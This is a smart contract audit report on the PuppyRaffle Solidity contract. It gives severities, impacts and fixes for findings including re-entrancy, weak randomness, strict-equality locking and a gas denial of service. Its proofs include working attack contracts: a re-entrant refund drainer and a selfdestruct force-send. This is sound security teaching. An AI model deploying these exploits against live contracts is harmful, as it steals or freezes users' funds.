### H-1 Re-entrancy on refund

When `PuppyRaffle::refund` is called, eth is sent to player before the state accounting for the refund is updated. This allows for re-entrancy.

**Impact**

Since this vulnerability can lead to the entire contract being drained of funds, this issue is of high severity.

**Proof of Concept**

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma experimental ABIEncoderV2;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract PuppyRaffleTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address playerOne = address(1);
    address playerTwo = address(2);
    address playerThree = address(3);
    address playerFour = address(4);
    address feeAddress = address(99);
    uint256 duration = 1 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, duration);
    }

    function test_srw_reentrancy_attack_can_pull_all_funds_via_refund()
        public
        playersEntered
    {
        ReentrancyAttack attack = new ReentrancyAttack(
            puppyRaffle,
            entranceFee
        );

        vm.deal(address(attack), entranceFee);

        attack.enterRaffle();
        assertEq(address(attack).balance, 0);

        attack.attack();

        assertEq(address(puppyRaffle).balance, 0);
        assertEq(address(attack).balance, entranceFee * 5);
    }
}

contract ReentrancyAttack {
    uint256 s_indexOfPlayer;
    PuppyRaffle s_puppyRaffle;
    uint256 s_entranceFee;
    uint256 s_reentrancy_count = 4;

    constructor(PuppyRaffle puppyRaffle, uint256 entranceFee) {
        s_puppyRaffle = puppyRaffle;
        s_entranceFee = entranceFee;
    }

    function enterRaffle() public {
        address[] memory players = new address[](1);
        players[0] = address(this);

        s_puppyRaffle.enterRaffle{value: s_entranceFee}(players);
        s_indexOfPlayer = s_puppyRaffle.getActivePlayerIndex(address(this));
    }

    function attack() public {
        s_puppyRaffle.refund(s_indexOfPlayer);
    }

    receive() external payable {
        if (s_reentrancy_count > 0) {
            s_reentrancy_count -= 1;
            s_puppyRaffle.refund(s_indexOfPlayer);
        }
    }
}
```

**Mitigation**

Zero-out the address for the player's index before the funds are sent.

```diff
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(
        playerAddress == msg.sender,
        "PuppyRaffle: Only the player can refund"
    );
    require(
        playerAddress != address(0),
        "PuppyRaffle: Player already refunded, or is not active"
    );

+   players[playerIndex] = address(0);
    payable(msg.sender).sendValue(entranceFee);

-   players[playerIndex] = address(0);
    emit RaffleRefunded(playerAddress);
}
```

### H-2 Weak RNG allows for miners to determine winner

Since RNG algorithm for `PuppyRaffle::selectWinner` relies on `block.timestamp`, a miner can quickly test the output of some transaction block orderings to attain a favourable result.

**Impact**

This vulnerability can guarantee an attacker to win. Since this would steal 80% of the funds from the contract, this is considered a high severity threat. 

**Proof of Concept**

It’s actually not hard at all for miners to guarantee a win.

“Cracking the randomness” is as simple as tossing out blocks that don’t have a random value that you want. If a miner were to mine the winning block, but notice that the raffle result that they get isn’t what they want, they could simply throw it out and try again. This removes all fairness and randomness from a system.

If a group of miners were to “farm” in this sense for the winning raffle result, then it would essentially remove any randomness and fairness from the contract. Even 1 miner doing this technically makes the random number not actually random, but heavily influenced by the miners.

They do have to forgo the rewards since they would be not publishing a block, but especially in this case where the raffle result was many times over worth much more than their block reward, miners are actually heavily incentivized to farm for the raffle result that gives them the most value instead of being honest.

It’s not a question of how easy it is for miners, it’s pretty trivial for a miner to influence the fairness and randomness of using this method. The real question is whether or not they are economically incentivized to. And in this case, they are incentivized to act unfairly.

This is why we can’t rely on randomness in a deterministic system. Even with 2 transactions, the miners can still pick (or heavily influence) the winners based on selfish values. We need to look outside the blockchain to achieve true randomness.

**Mitigation**

The solution here, is we need a way to create randomness that is verifiable and tamper-proof from miners and rerollers. We also have to do this using an oracle 13. Actual randomness in deterministic systems like a blockchain is nearly impossible without one.

Chainlink VRF 25 is this exact solution. It looks off-chain for a random number, and is checked for it’s randomness on-chain by what’s called the VRF Coordinator 3. It works like so:

    A user requests a random number by calling some function inputting their own RNG seed. This function emits a log that an off-chain chainlink node reads.
    The off-chain oracle reads this log, and creates a random number based on the nodes keyhash and the users seed. It then returns the number in a second transaction back on-chain, going through the VRF Coordinator which verifies that the number is actually random.

How does this solve the 2 issues above?
You can’t reroll attack

Since this process is in 2 transactions, and the 2nd transaction is where the random number is created, you can’t see the random number and cancel your transaction.
The miners don’t have influence

Since you’re not using values that the miners have control over like block.difficulty or values that are predictable like block.timestamp, the miners can’t control the random number.

You can read more about it here 43 and see the math and science behind the world-class group of researchers who developed it.

Explanation credit to Patrick Collins: https://forum.openzeppelin.com/t/understanding-the-meebits-exploit/8281/8

### H-3 Strict squality can disable withdrawing of fees

In `PuppyRaffle::withdrawFees`, the contract checks its balance against the totalFee count. If an attacking contract forcefully pushes funds to `PuppyRaffle`, then the contract enters a state where it is no longer possible to withdraw fees.

**Proof of Concept**

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma experimental ABIEncoderV2;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract PuppyRaffleTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address playerOne = address(1);
    address playerTwo = address(2);
    address playerThree = address(3);
    address playerFour = address(4);
    address feeAddress = address(99);
    uint256 duration = 1 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, duration);
    }

    function test_srw_strict_equality_can_be_exploited_so_cant_withdraw_fees()
        public
        playersEntered
    {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        puppyRaffle.selectWinner();

        SelfDestructAttack attack = new SelfDestructAttack(puppyRaffle);
        vm.deal(address(attack), 1 ether);
        attack.attack();

        vm.expectRevert();
        puppyRaffle.withdrawFees();
    }
}

contract SelfDestructAttack
{
    PuppyRaffle s_puppyRaffle;

    constructor(PuppyRaffle puppyRaffle) {
        s_puppyRaffle = puppyRaffle;
    }

    function attack() public {
        selfdestruct(payable(address(s_puppyRaffle)));
    }
}
```

**Mitigation**

Instead, check that the `players` object is empty.

```diff
function withdrawFees() external {
    // audit-info: not onlyOwner, so anyone can start a new raffle?
    require(
-       address(this).balance == uint256(totalFees),
+       players.length != 0,
        "PuppyRaffle: There are currently players active!"
    );
    uint256 feesToWithdraw = totalFees;
    ...
}
```

### L-4 Withdrawal of funds denied by denying funds on selectWinner

If during `PuppyRaffle::selectWinner` the winner is a contract with no payable `receive` or `fallback` function, the result is reverted and a new winner must be determined.

**Impact**

The loss is only realized by the participant. Thus, the impact is low.

**Mitigation**

Employ a **pull** strategy instead of a push strategy.

### H-5 DOS - enterRaffle becomes more expensive the more players enter

**Description**

There is loop in enterRaffle that checks for duplicate players. It is unbounded and expands as more players enter. This means that for every new player that joins, the next player has to pay more gas to join. 

**Impact**

It costs the 100th player around 90x more gas to enter than the first player. This gross unfairness implies a high severity. 

**Proof of Concept**

```jsx
function test_srw_GAS_DOS_enterRaffle_gets_more_expensive_for_consecutive_players()
    public
{
    uint256 i = 0;

    while (i < 4) {
        uint256 gasSpent = enterAndLogGas(i);
        console.log("[ Player ", i, "] Gas spent: ", gasSpent);
        i += 1;
    }

    while (i < 100) {
        enterAndLogGas(i);
        i += 1;
    }

    uint256 gasSpent = enterAndLogGas(i);
    console.log("[ Player ", i, "] Gas spent: ", gasSpent);
}

function enterAndLogGas(uint256 i) internal returns (uint256) {
    address[] memory players = new address[](1);
    players[0] = address(i);
    uint256 gasStart = gasleft();

    vm.deal(address(i), entranceFee);
    vm.prank(address(i));
    puppyRaffle.enterRaffle{value: entranceFee}(players);

    uint256 gasSpent = gasStart - gasleft();

    return gasSpent;
}
```

Output:
```
[PASS] test_srw_GAS_DOS_enterRaffle_gets_more_expensive_for_consecutive_players() (gas: 140380376)
Logs:
  [ Player  0 ] Gas spent:  44608
  [ Player  1 ] Gas spent:  34685
  [ Player  2 ] Gas spent:  36553
  [ Player  3 ] Gas spent:  39209
  [ Player  100 ] Gas spent:  4047054
```

**Mitigation**

There are several approaches:

1. **Remove the check for duplicate addresses.** A user can freely create new wallets if they want to re-enter anyway, so duplicate addresses don't achieve anything.
2. **Use a mapping to check for duplicate addresses.** This allows for contant-time lookups to check for duplicates.

### L-6 GetActivePlayerIndex returns address(0) for both first player and non-player

### S-7 Casting `fee` in `selectWinner` from uint256 allows for overflow
